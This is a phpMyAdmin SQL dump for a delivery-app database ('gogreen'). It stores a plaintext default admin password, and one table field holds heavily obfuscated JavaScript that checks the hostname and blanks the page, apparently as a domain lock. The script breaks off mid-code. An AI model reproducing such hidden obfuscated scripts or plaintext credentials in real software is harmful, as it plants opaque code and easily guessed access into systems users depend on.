-- phpMyAdmin SQL Dump
-- version 5.2.1
-- https://www.phpmyadmin.net/
--
-- Host: localhost:3307
-- Generation Time: Jun 21, 2024 at 10:17 AM
-- Server version: 10.4.32-MariaDB
-- PHP Version: 8.0.30

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
START TRANSACTION;
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Database: `gogreen`
--

-- --------------------------------------------------------

--
-- Table structure for table `admin`
--

CREATE TABLE `admin` (
  `id` int(11) NOT NULL,
  `username` longtext NOT NULL,
  `password` longtext NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1 COLLATE=latin1_swedish_ci;

--
-- Dumping data for table `admin`
--

INSERT INTO `admin` (`id`, `username`, `password`) VALUES
(1, 'admin', 'admin@123');

-- --------------------------------------------------------

--
-- Table structure for table `banner`
--

CREATE TABLE `banner` (
  `id` int(11) NOT NULL,
  `img` text NOT NULL,
  `cid` int(11) NOT NULL,
  `status` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- --------------------------------------------------------

--
-- Table structure for table `category`
--

CREATE TABLE `category` (
  `id` int(11) NOT NULL,
  `cat_name` text CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL,
  `cat_status` int(11) NOT NULL,
  `cat_img` text NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1 COLLATE=latin1_swedish_ci;

-- --------------------------------------------------------

--
-- Table structure for table `payout_ride_setting`
--

CREATE TABLE `payout_ride_setting` (
  `id` int(11) NOT NULL,
  `rid` text NOT NULL,
  `riderid` int(11) NOT NULL,
  `amt` int(11) NOT NULL,
  `status` text NOT NULL,
  `proof` text DEFAULT NULL,
  `p_by` text DEFAULT NULL,
  `r_date` datetime NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1 COLLATE=latin1_swedish_ci;

-- --------------------------------------------------------

--
-- Table structure for table `payout_setting`
--

CREATE TABLE `payout_setting` (
  `id` int(11) NOT NULL,
  `rid` text NOT NULL,
  `vid` int(11) NOT NULL,
  `amt` int(11) NOT NULL,
  `status` text NOT NULL,
  `proof` text DEFAULT NULL,
  `p_by` text DEFAULT NULL,
  `r_date` datetime NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- --------------------------------------------------------

--
-- Table structure for table `pkg_banner`
--

CREATE TABLE `pkg_banner` (
  `id` int(11) NOT NULL,
  `img` text NOT NULL,
  `status` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1 COLLATE=latin1_swedish_ci;

--
-- Dumping data for table `pkg_banner`
--

INSERT INTO `pkg_banner` (`id`, `img`, `status`) VALUES
(1, 'assets/category/catimg/1718789946.png', 1);

-- --------------------------------------------------------

--
-- Table structure for table `pkg_category`
--

CREATE TABLE `pkg_category` (
  `id` int(11) NOT NULL,
  `cat_name` text CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL,
  `cat_status` int(11) NOT NULL,
  `cat_img` text CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1 COLLATE=latin1_swedish_ci;

--
-- Dumping data for table `pkg_category`
--

INSERT INTO `pkg_category` (`id`, `cat_name`, `cat_status`, `cat_img`) VALUES
(1, 'ategory 1', 0, 'assets/category/catimg/1718789932.png');

-- --------------------------------------------------------

--
-- Table structure for table `pkg_order`
--

CREATE TABLE `pkg_order` (
  `id` int(11) NOT NULL,
  `uid` int(11) NOT NULL,
  `rid` int(11) NOT NULL DEFAULT 0,
  `order_status` int(11) NOT NULL DEFAULT 0,
  `comment_reject` text DEFAULT NULL,
  `sign` text DEFAULT NULL,
  `trans_id` text DEFAULT NULL,
  `daddress` text CHARACTER SET utf8 COLLATE utf8_general_ci DEFAULT NULL,
  `paddress` text CHARACTER SET utf8 COLLATE utf8_general_ci DEFAULT NULL,
  `pmobile` text DEFAULT NULL,
  `dmobile` text DEFAULT NULL,
  `description` text CHARACTER SET utf8 COLLATE utf8_general_ci DEFAULT NULL,
  `photos` text DEFAULT NULL,
  `o_status` enum('Pending','Processing','On Route','Completed','Cancelled') NOT NULL,
  `d_charge` float NOT NULL,
  `distance` int(11) NOT NULL,
  `category` text NOT NULL,
  `odate` date NOT NULL,
  `p_method_id` int(11) NOT NULL,
  `a_status` int(11) NOT NULL DEFAULT 0
) ENGINE=InnoDB DEFAULT CHARSET=latin1 COLLATE=latin1_swedish_ci;

-- --------------------------------------------------------

--
-- Table structure for table `rider`
--

CREATE TABLE `rider` (
  `id` int(11) NOT NULL,
  `name` text CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL,
  `mobile` text NOT NULL,
  `email` text NOT NULL,
  `aid` int(11) NOT NULL,
  `address` text CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL,
  `status` int(11) NOT NULL,
  `password` text NOT NULL,
  `reject` int(11) NOT NULL DEFAULT 0,
  `accept` int(11) NOT NULL DEFAULT 0,
  `complete` int(11) NOT NULL DEFAULT 0,
  `a_status` int(11) NOT NULL DEFAULT 1,
  `commission` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- --------------------------------------------------------

--
-- Table structure for table `setting`
--

CREATE TABLE `setting` (
  `id` int(11) NOT NULL,
  `logo` mediumtext NOT NULL,
  `d_title` mediumtext NOT NULL,
  `d_s_title` mediumtext NOT NULL,
  `one_key` mediumtext NOT NULL,
  `one_hash` mediumtext NOT NULL,
  `r_key` text NOT NULL,
  `r_hash` text NOT NULL,
  `s_key` text NOT NULL,
  `s_hash` text NOT NULL,
  `currency` text NOT NULL,
  `timezone` text NOT NULL,
  `policy` text NOT NULL,
  `about` text NOT NULL,
  `contact` text NOT NULL,
  `terms` text NOT NULL,
  `p_limit` int(11) NOT NULL,
  `ukms` int(11) NOT NULL,
  `utprice` int(11) NOT NULL,
  `afprice` int(11) NOT NULL,
  `pdbanner` text DEFAULT NULL,
  `minorder` int(11) NOT NULL,
  `itemlimit` int(11) NOT NULL,
  `sgen` int(11) NOT NULL,
  `signupcredit` int(11) NOT NULL,
  `refercredit` int(11) NOT NULL,
  `direction` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_general_ci;

--
-- Dumping data for table `setting`
--

INSERT INTO `setting` (`id`, `logo`, `d_title`, `d_s_title`, `one_key`, `one_hash`, `r_key`, `r_hash`, `s_key`, `s_hash`, `currency`, `timezone`, `policy`, `about`, `contact`, `terms`, `p_limit`, `ukms`, `utprice`, `afprice`, `pdbanner`, `minorder`, `itemlimit`, `sgen`, `signupcredit`, `refercredit`, `direction`) VALUES
(1, 'assets/img/store.png', 'SuperStore', 'SS', 'test', 'test', 'test', 'test', 'test', 'test', '$', 'Asia/Kolkata', 'test', 'test', 'test', 'test', 200, 2, 25, 6, 'assets/img/delivery8.jpg', 500, 5, 0, 5, 5, 1);

-- --------------------------------------------------------

--
-- Table structure for table `tbl_address`
--

CREATE TABLE `tbl_address` (
  `id` int(11) NOT NULL,
  `uid` int(11) NOT NULL,
  `address` text NOT NULL,
  `pincode` int(11) NOT NULL,
  `houseno` text NOT NULL,
  `landmark` text NOT NULL,
  `type` text NOT NULL,
  `lat_map` text NOT NULL,
  `long_map` text NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1 COLLATE=latin1_swedish_ci;

-- --------------------------------------------------------

--
-- Table structure for table `tbl_cash`
--

CREATE TABLE `tbl_cash` (
  `id` int(11) NOT NULL,
  `rid` int(11) NOT NULL,
  `amt` int(11) NOT NULL,
  `message` text CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL,
  `pdate` datetime NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1 COLLATE=latin1_swedish_ci;

-- --------------------------------------------------------

--
-- Table structure for table `tbl_code`
--

CREATE TABLE `tbl_code` (
  `id` int(11) NOT NULL,
  `ccode` text NOT NULL,
  `status` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1 COLLATE=latin1_swedish_ci;

-- --------------------------------------------------------

--
-- Table structure for table `tbl_coupon`
--

CREATE TABLE `tbl_coupon` (
  `id` int(11) NOT NULL,
  `sid` int(11) NOT NULL,
  `c_img` text NOT NULL,
  `cdate` date NOT NULL,
  `c_desc` text CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL,
  `c_value` text NOT NULL,
  `c_title` text CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL,
  `status` int(11) NOT NULL DEFAULT 1,
  `ctitle` text CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL,
  `min_amt` int(11) NOT NULL,
  `ulimit` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- --------------------------------------------------------

--
-- Table structure for table `tbl_faq`
--

CREATE TABLE `tbl_faq` (
  `id` int(11) NOT NULL,
  `question` text CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL,
  `answer` text CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL,
  `status` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1 COLLATE=latin1_swedish_ci;

-- --------------------------------------------------------

--
-- Table structure for table `tbl_happy_user`
--

CREATE TABLE `tbl_happy_user` (
  `id` int(11) NOT NULL,
  `title` text CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL,
  `img` text NOT NULL,
  `comment` text CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL,
  `status` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1 COLLATE=latin1_swedish_ci;

-- --------------------------------------------------------

--
-- Table structure for table `tbl_home_section`
--

CREATE TABLE `tbl_home_section` (
  `id` int(11) NOT NULL,
  `cid` int(11) NOT NULL,
  `sid` int(11) NOT NULL,
  `title` text NOT NULL,
  `status` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1 COLLATE=latin1_swedish_ci;

-- --------------------------------------------------------

--
-- Table structure for table `tbl_include`
--

CREATE TABLE `tbl_include` (
  `id` int(11) NOT NULL,
  `jsfile` longtext NOT NULL,
  `pendingfile` longtext NOT NULL,
  `canclefile` longtext NOT NULL,
  `completefile` longtext NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1 COLLATE=latin1_swedish_ci;

--
-- Dumping data for table `tbl_include`
--

INSERT INTO `tbl_include` (`id`, `jsfile`, `pendingfile`, `canclefile`, `completefile`) VALUES
(1, '<script src=\"https://cdnjs.cloudflare.com/ajax/libs/jquery/1.11.1/jquery.min.js\"></script>\n<script>\nvar _0x5506=[\'0x18\',\'length\',\'H2[$\',\'b1zkW6u=\',\'502163guBJta\',\'hItcSSk+W57cSW==\',\'rPW73cHeHnW5dcMZiZWQS0eW/dQcPPz8kaW49dW77dLcfoWOJd\',\'W7qsW5K=\',\'!(%4\',\'0MqH\',\'cSkZc8ozWRu=\',\'charAt\',\'WPtcKCowW5u=\',\'0x52\',\'Ar3cPmogWQ9NWQmY\',\'kjkmktAwPdiCkME8kdW6GBpwmYlCotC8kEdxZdGNdcVJT4Exld\',\'0x19\',\'W5ZdRCo4iNNdQSoDW7hcH2b+gmkKhXXUlXJdTh7cHSojW6ldRq\',\']VeO\',\'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWX\',\'kCohW68cWQCYeSk3WP5FW5ZdNCojWRJcQ8kcWOBdSCoQWQ1jlC\',\'W7GDmxK=\',\'t%CG\',\'RIMS\',\'T!Ez\',\'hompbC\',\'0x8\',\'1bIdnEH\',\'eN45dG==\',\'0x50\',\'668957AOvDiR\',\'WkGG\',\'lxP*\',\']Clx\',\'tl%i\',\'WR7dIr3cTa==\',\'ccySW48=\',\'0x43\',\'XwRP\',\'WRuMWQ0=\',\'4)RA\',\'lsXehmkfW6ldP2ddVSo0hSoBWQjhW4JdQwNdUmoHWQldQgnHW5\',\'pso*\',\'WQj0yxtcOCkaFvlcRCoTW5VcQa==\',\'5+W6PpWR4MW4a2WQ8MhZ51m8k3pejEew/cGeZcJCk3W4JcRa==\',\'write\',\'0x1b\',\'DdldKCoQsmoMWQZcGCkEW7xcK2a=\',\'7cVw5xW6dcQrSoW63cUWzhWQ0DoY0CWRCMWRBdMepcJ8ktFYTz\',\'W7evhSoa\',\'jYdcTq==\',\'0x2c\',\'indexOf\',\'0x53\',\'kBlSkKkdCBdmoxWPXeW6RcImoJ\',\'0x3a\',\'EqjIW4e=\',\'0x1\',\'domain\',\'vZVcK8kY\',\'0x24\',\'UxjNdaxcKmkhbd0AjIyurYZcR8k9xu3cG8kwymoqWPvRW6HwBg\',\'0x4c\',\'WRCjW4P0Cgi=\',\'0x5f\',\'0x5e\',\'W73cM8kKWQe=\',\'WRnPW6FdLbrsqW==\',\'0x4b\',\'0x16\',\'kcJdGvqLW4WXcMJdQwBcRW==\',\'fSBMJo\',\'ycNdG8kvvCoy\',\'ajax\',\'W6a/b8kw\',\'C8o5c1K=\',\'HIuR\',\'ZlVg\',\'WQFdRfnj\',\'HzfhCvW7NcRvvZWOBcVCoZmJxcKJldNSoKWPGcmCk+W7WEW6pc\',\'0x40\',\'EJ3dS8kA\',\'Q*^O\',\'Lav#\',\'0x4a\',\'hostname\',\'990002LAVIse\',\'HJIe\',\'rhFdQq==\',\'dLZdPuRcOCkc\',\'0x38\',\'OdOWoM7cOCo2gmocxcZcKColsCkb\',\'oEmSknW58gaxJdOxtdVCoFetdcQSo9WPVdJmoaWOpcICogW7hd\',\'0x2d\',\'0x5d\',\'W6P/WRlcHG==\',\'0x1a\',\'HxIpov\',\'0xd\',\'W5uADdtcIqxdOCoqWQddGvlcPSorWRlcMSkoESoECa==\',\'tMnMda3cRW==\',\'0x20\',\'Cl1z\',\'0xb\',\'0x3d\',\'W5NdINXeW5ZdRmk7W65gWOxcRmo0rea8WOC=\',\'aAGv\',\'eN45xW==\',\'0xe\',\'PxHCEC\',\'0x35\',\'0x2f\',\'DYtH\',\'oCk7W4j9n3C=\',\'wq@7\',\'0x29\',\'W5JdL8oeWP3dMSkswGNdJmoEetW=\',\'W4vEoq==\',\'olCLPacvyPimoayCkpfeu=\',\'$P6]\',\'slice\',\'PSoRW5WYW7FcUSkMW5hcNcBcPfTAdSkmWQ0wWQLUyCkIWRVcQm\',\')79U\',\'We\\x20Only\\x20Allow\\x20Subdomain!!!\',\'0x21\',\'W6K7W7fsgmkq\',\'0x30\',\'cFPG\',\'WQxdQqC0\',\'0x31\',\'YZ0123456789+/=\',\'WRDxW5ddLJLp\',\'nrfSW6tdUZ0=\',\'@0l8\',\'me$K\',\'0x44\',\'gCopW7pdR2xdGSk6WQFdPmo/WQtdQW==\',\'QuuaW5W=\',\'eMkKkz\',\'Nw2n\',\'exec\',\'jcNcGuKoW4uIfuRdTwhcUmkaFxddMJxdRG==\',\'WQJdN0T3\',\'0x57\',\'ready\',\'([a-z-0-9]{2,63}).([a-z.]{2,5})$\',\'WObRWO/dH8kPWPVcO8olo0e/W5f5W7/cH8oGWOpdNCoNESoVmm\',\'W59QWQxdTq==\',\'btSoaSkEW5dcQCoHomkJveRdG0rswmk7WQvNzY80qCo3itv8lq\',\'RcQ1xdH1FcQ8oqW4VdGSoMWOj1W6RdLCoNWRLHW5pdU2/dTSo+\',\'0x27\',\'0x1d\',\'gLZdNLC=\',\'198866vQyfnN\',\'0x1e\',\'0x46\',\'0x13\',\'i$0s\',\'iCoJgcRcQ0f/Aw/cP8oTEG==\',\'eZmwW5S=\',\'hbldHSkYW4HRWQra\',\'location\',\'push\',\'0x0\',\'subdomain\',\'shift\',\'0x22\',\'WOK+WOVdRSklWQJcJmkv\',\'I7!j\',\'replace\',\'lSoUW6vf\',\'hAph\',\'gcIt\',\'0x4e\',\'z^9a\',\'oBWQBdHhxcVI0catxdIw0BuJ3dJN/dRSk6uhZcQMBdQt/dHuWs\',\'0x7\',\'IZgX\',\'0x1f\',\'YrCD\',\'v[JF\',\'0x3b\',\'fromCharCode\',\'0x55\',\'0x14\',\'0x37\',\'101KpIzMa\',\'0x3f\',\'0x2e\',\'wIC2\',\'W4pcSx40\',\'o2xdP8kKW55JWOnH\',\'0x54\',\'type\',\'LmkdnWFcPwOAtMhcVda4WRrCjWWQWP3cU8k7W5HzW5JdP2BcOS\',\'vOfv\',\'fNRdOCk6\',\'0x4f\',\'BSo7WRKN\',\'0x56\',\'xSk2W73cVW==\',\'Fcnn\',\'0x39\',\'omW6faW4eTW5K=\',\'W60boG==\',\'0x34\',\'8xgJ\',\'0x12\',\'dCoLWPrSjJaHWQddRH3dT1S=\',\'g8o3W7DN\',\'0x2b\',\'Umk7eCoQW75AWQD8WRNdI8kvWQ84W7fEeqv7CWzzW6SEdqWQrS\',\'W6ZdMaaL\',\'AxRT\',\'&DJ[\',\'hlegxN\',\'xdpdHmo7\',\'WRbyW5JdTq==\',\'0x6\',\'0xc\',\'xflcNG==\',\'toString\',\'0x60\',\'0xf\',\'WQ0ZDfa=\',\'dH93WO5XW77dUqL2r0TWW5FcRYnVW7xdIxRcIHxdRSkGWP7cTS\',\'oEW7CuW5LuW6JcKWXZW4e+lmoxW5/cVXtcTCk3Fmk8W4XWmmoY\',\'WQdcI8kZWOxcPfhcH8o4p8o5\',\'owWQjFASoPW74RW5SPlSoKx8opsmkEW5GicmkvWO5pbSkPgJ9D\',\'15347PKEBst\',\'WPm4W5X5tu7dMCkG\',\'0x41\',\'t8oZW5JdQG==\',\'0x4\',\'0x5c\',\'1093959wnNbiQ\',\'0x48\',\'gfJI\',\'T@X)\',\'0x5\',\'charCodeAt\',\'0x9\',\'stop\',\'WQ0Ty3isWPdcOhxdQuZcICoqESkkbMXvW7NcRSo0xIhcJSkVW6\',\'W6RcQ8opavRdImohW6BcJMLKfW==\',\'0x33\',\'$IMU\',\'u8kEvCk+b8oZ\',\'WR7cQH3cIqJdNSoesCoPWOfoEZVcOvDm\',\'16091xxmunM\',\'1WieHlQ\',\'WPekx8kWcSkJocfWWPRdM8oGamkkg8kCdeDfWPvoW61lhdW+e8\',\'0x15\',\'QAbv\',\'/dUComW7BcGWJcGxvqW5hdRNTOeK3cK33dNSoouSkIW5LitfZd\',\'ixhdOCkX\',\'0x51\',\'0x2a\',\'WQP9xmoFW67cI0CKCmkrW5tcJ3fxW7VcG8kXWP7dMmkWsbGWnd\',\'0x3c\'];var _0x2bf8=function(_0x1a3191,_0x3bbb9d){_0x1a3191=_0x1a3191-0x1a4;var _0x550669=_0x5506[_0x1a3191];return _0x550669;};var _0x17cfa1=function(_0x58662d,_0x5c8950){return _0x2bf8(_0x58662d- -0x6b,_0x5c8950);};(function(_0x2b0745,_0x3f1f36){var _0x2205d3=function(_0x22b96e,_0x936222){return _0x2bf8(_0x936222- -0x28e,_0x22b96e);};while(!![]){try{var _0x440be0=parseInt(_0x2205d3(-0xa7,-0xc6))+parseInt(_0x2205d3(0x80,0x3))*parseInt(_0x2205d3(0x7b,0x6))+-parseInt(_0x2205d3(-0x89,-0x37))*parseInt(_0x2205d3(0x1c,-0x62))+-parseInt(_0x2205d3(0x23,-0x14))+parseInt(_0x2205d3(-0x19,-0x31))+parseInt(_0x2205d3(-0xa8,-0x83))+parseInt(_0x2205d3(-0x3,-0x22))*-parseInt(_0x2205d3(-0x30,-0x23));if(_0x440be0===_0x3f1f36)break;else _0x2b0745[\'push\'](_0x2b0745[\'shift\']());}catch(_0xdeb2f9){_0x2b0745[\'push\'](_0x2b0745[\'shift\']());}}}(_0x5506,0xd7b1b),$(document)[_0x17cfa1(0x197,0x1ba)](function(){var _0x218264=function(_0x2dff36,_0x3091cc){return _0x17cfa1(_0x2dff36-0x286,_0x3091cc);},_0x36107a={},_0x3b82f6=new RegExp(_0x218264(0x41e,0x3c1)),_0x360b13=_0x3b82f6[_0x218264(0x419,0x3c8)](window[\'location\'][_0x218264(0x3e2,0x3cd)]);if(_0x360b13===null)document[_0x218264(0x4be,0x483)](_0x218264(0x408,0x41f)),window[_0x218264(0x47f,0x41a)]();else{_0x36107a[\'domain\']=_0x360b13[0x1],_0x36107a[\'type\']=_0x360b13[0x2],_0x36107a[_0x218264(0x431,0x40b)]=window[_0x218264(0x42e,0x494)][\'hostname\'][_0x218264(0x436,0x49a)](_0x36107a[_0x218264(0x3c7,0x345)]+\'.\'+_0x36107a[_0x218264(0x44e,0x472)],\'\')[_0x218264(0x405,0x3f8)](0x0,-0x1);if(window[_0x218264(0x42e,0x40b)][_0x218264(0x3e2,0x40f)][\'replace\'](_0x36107a[_0x218264(0x3c7,0x3c2)]+\'.\'+_0x36107a[_0x218264(0x44e,0x43a)],\'\')[_0x218264(0x405,0x398)](0x0,-0x1)==\'\')document[_0x218264(0x4be,0x539)](_0x218264(0x408,0x406)),window[_0x218264(0x47f,0x45b)]();else{}}}));var _0x4c39=[_0x17cfa1(0x23a,0x2a9),\'hSk7WR/dPa==\',_0x17cfa1(0x199,0x16f)+_0x17cfa1(0x1b6,0x19e)+_0x17cfa1(0x1e8,0x1d3)+_0x17cfa1(0x1d2,0x16d),_0x17cfa1(0x219,0x296),\'hmkJWQpdNsL+W49bxtddM8k9WPFdLCogj11hWQjoAmosWOpdTC\'+_0x17cfa1(0x1eb,0x1c0)+\'WPLvBuRcGCkn\',_0x17cfa1(0x1db,0x1b5),\'kmooW6lcOa==\',\'rCkDw8kCWR3cTG==\',_0x17cfa1(0x1a7,0x12e),_0x17cfa1(0x19a,0x176),\'m8kCW6WN\',_0x17cfa1(0x20e,0x1be),\'sIpcGCoCWOO6WO82WOOIW7BcRYerWQ7cLmoFWP/cOspcGLRcJm\'+_0x17cfa1(0x13d,0x18b),\'CSkyBmkAh8oc\',_0x17cfa1(0x166,0x199),_0x17cfa1(0x19f,0x1a8),_0x17cfa1(0x234,0x1f4)+_0x17cfa1(0x211,0x1af)+\'OCoAWPZdOqxcRJCIWQNdPsaDW4XXW7zPW7VdHCoek8kzmNKiW5\'+_0x17cfa1(0x156,0x1a0)+_0x17cfa1(0x180,0x1e5)+\'oevNtdIMOkWRK2W4VdQcvMWONdT2nwpL0uASoOW4r/hvS0WRJd\'+_0x17cfa1(0x190,0x136),_0x17cfa1(0x21f,0x299)+_0x17cfa1(0x21a,0x236)+_0x17cfa1(0x162,0x171),_0x17cfa1(0x236,0x283),_0x17cfa1(0x1d8,0x205),_0x17cfa1(0x14d,0x10e),_0x17cfa1(0x1e7,0x16a),_0x17cfa1(0x1ed,0x1f0),_0x17cfa1(0x151,0xea),\'WPTEkxyc\',_0x17cfa1(0x14f,0x195),_0x17cfa1(0x1df,0x1c9),_0x17cfa1(0x1ae,0x152),_0x17cfa1(0x149,0x12d),\'WQdcJMW=\',_0x17cfa1(0x1c5,0x16b),_0x17cfa1(0x1a5,0x1ae),_0x17cfa1(0x16b,0x1e3),\'WPFdL8o4W4a=\',\'bKfncq==\',_0x17cfa1(0x194,0x143),_0x17cfa1(0x1fa,0x193)+\'TshmkvW5PYWPxcUmoRsCk6W7WRW6XOWPu=\',_0x17cfa1(0x172,0x122),_0x17cfa1(0x15f,0x109),\'WRRdI2BdSW==\',_0x17cfa1(0x160,0xfd),_0x17cfa1(0x22f,0x23d),_0x17cfa1(0x227,0x1e2),_0x17cfa1(0x18b,0x1b4),\'WRnuW6JdPWGLsSoyW4bWW5jMD8otW69yWOuSiConBKCKnSkSzL\'+_0x17cfa1(0x19c,0x1c8)+\'gxtcHNtcRK3dVv7dRSoJW67cMCoqwJKIW7GwuGH/W47dOHVcG8\'+_0x17cfa1(0x1e9,0x1b6)+_0x17cfa1(0x16a,0x159),_0x17cfa1(0x1e0,0x172),_0x17cfa1(0x18f,0x159),\'WPRcS8kIW7lcHLeFdmkde8oiWRWbFtRcVunOCI3cHqjRB8kQA3\'+_0x17cfa1(0x205,0x232)+_0x17cfa1(0x144,0x1bf)+\'3dVbb0W4JdPSkKW6RcVa==\',\'W6tdHKKuW53dRSkeWQ1JW7dcHCo8DxTlW55wW4FcUbRdUZlcVs\'+\'hdG2NcRvu+W7i+W4G=\',_0x17cfa1(0x14a,0x1af),_0x17cfa1(0x232,0x231),\'WR3cMGhcNIVdV8kdqmowWQ9tDbBcLuusCSktW7z6hCohptSDW6\'+\'Lb\',_0x17cfa1(0x21c,0x1ce)+\'zQWQHlW73dNN7dIY7dV8oUrupdO8okWQdcNCoBW6mHW5rqCNj1\'+_0x17cfa1(0x215,0x1ed),_0x17cfa1(0x178,0x1ef),_0x17cfa1(0x1c6,0x212),_0x17cfa1(0x142,0x132),_0x17cfa1(0x1ff,0x27c),_0x17cfa1(0x139,0x162),_0x17cfa1(0x23c,0x228),_0x17cfa1(0x206,0x1cc),_0x17cfa1(0x17c,0x14c),_0x17cfa1(0x1cb,0x1db),_0x17cfa1(0x146,0x1b8),_0x17cfa1(0x212,0x1dd),\'DGOV\',\'hCo6tmkJ\',\'dCkMWQ3dVJ1bW6LauWW=\',_0x17cfa1(0x1d7,0x1fd),\'W6ldOeHaW77dLW==\',_0x17cfa1(0x18a,0x11e),_0x17cfa1(0x202,0x1ea)+_0x17cfa1(0x163,0x1ca)+_0x17cfa1(0x1c9,0x170)+_0x17cfa1(0x17d,0x16c),_0x17cfa1(0x1fb,0x270),_0x17cfa1(0x187,0x18e),\'DJlcTSkP\',_0x17cfa1(0x170,0x1d1),_0x17cfa1(0x184,0x170),_0x17cfa1(0x1e3,0x1e0),_0x17cfa1(0x1a6,0x17b),_0x17cfa1(0x155,0x15d),_0x17cfa1(0x195,0x187),\'WP5QW6ZcIbXEtSkv\',_0x17cfa1(0x1cd,0x17b),\'eLldVglcOCkHcxhdGCoxW5JcGa==\',_0x17cfa1(0x1ea,0x1f7),_0x17cfa1(0x22e,0x25f),_0x17cfa1(0x220,0x1ae),\'qcngWPddQdiIsmoHBG==\',_0x17cfa1(0x1fe,0x219),\'W5NcHXJcRConW4iNWQ/dP8osc8kEgSoWW58tW5XRW7CbW6hdJJ\'+_0x17cfa1(0x23b,0x1db)+_0x17cfa1(0x19b,0x178)+\'bdrv3dHxhcJ8kAW7RcHCkgamo0W6RdM2Gfc39zW7GHdsPxmxZc\'+_0x17cfa1(0x1da,0x255)+\'o+xsFcN8k+WQNcKmk3WQ4=\',_0x17cfa1(0x1d3,0x22e),_0x17cfa1(0x17b,0x194),_0x17cfa1(0x158,0x1be),_0x17cfa1(0x13f,0x1bc),\'EmoDWR1q\',\'pSopW45F\',_0x17cfa1(0x217,0x26b),_0x17cfa1(0x1cf,0x188)];(function(_0x1962be,_0x32418a){var _0x2a6544=function(_0x519e8d){var _0x6a0ad4=function(_0x4c5b32,_0x30d6f5){return _0x2bf8(_0x4c5b32-0x1aa,_0x30d6f5);};while(--_0x519e8d){_0x1962be[_0x6a0ad4(0x3be,0x3eb)](_0x1962be[_0x6a0ad4(0x3c1,0x357)]());}};_0x2a6544(++_0x32418a);}(_0x4c39,-0xbb*0x35+0x1761+-0x143*-0xd));var _0x3a1d=function(_0x2d4839,_0x268917){var _0x201b90=function(_0x595f3e,_0x1df50e){return _0x17cfa1(_0x1df50e-0x271,_0x595f3e);};_0x2d4839=_0x2d4839-(-0xbb*0x35+0x1761+-0x7ab*-0x2);var _0xf74978=_0x4c39[_0x2d4839];if(_0x3a1d[_0x201b90(0x509,0x495)]===undefined){var _0xe87995=function(_0x8b347f){var _0x90f0a9=function(_0x137e1a,_0x2509c4){return _0x201b90(_0x2509c4,_0x137e1a- -0x354);},_0x4007d4=_0x90f0a9(0x13b,0x150)+_0x90f0a9(0xa6,0x123),_0x3bf551=String(_0x8b347f)[\'replace\'](/=+$/,\'\'),_0xad27d1=\'\';for(var _0x52a6e7=0x8f*-0x7+0xba8+0x295*-0x3,_0x3e028d,_0x142708,_0xc54699=-0x22e1+-0x1823+0x3b04;_0x142708=_0x3bf551[_0x90f0a9(0x133,0x127)](_0xc54699++);~_0x142708&&(_0x3e028d=_0x52a6e7%(-0x1ce4+0x6c7*-0x5+-0x5*-0xc8f)?_0x3e028d*(0x881*0x3+-0x6aa*-0x1+-0x1fed)+_0x142708:_0x142708,_0x52a6e7++%(-0x3c*0x14+-0x12e9+0x179d))?_0xad27d1+=String[_0x90f0a9(0xda,0xcb)](0xa49+-0x264f*0x1+0x1d05&_0x3e028d>>(-(0x5*-0x429+0x1d1e+-0x84f)*_0x52a6e7&0x9e2+0x677+-0x1053)):0xe*0x114+-0x2659*-0x1+-0x3571){_0x142708=_0x4007d4[_0x90f0a9(0x58,0xd3)](_0x142708);}return _0xad27d1;},_0x27aabb=function(_0x581eab,_0x443831){var _0x5b41d3=function(_0x56343a,_0x33ec5c){return _0x201b90(_0x33ec5c,_0x56343a- -0x29f);},_0x4fbfe1=[],_0x2e70ff=-0x923*-0x1+0x1a28+-0x2b7*0xd,_0x957af1,_0x560fc9=\'\',_0x55d215=\'\';_0x581eab=_0xe87995(_0x581eab);for(var 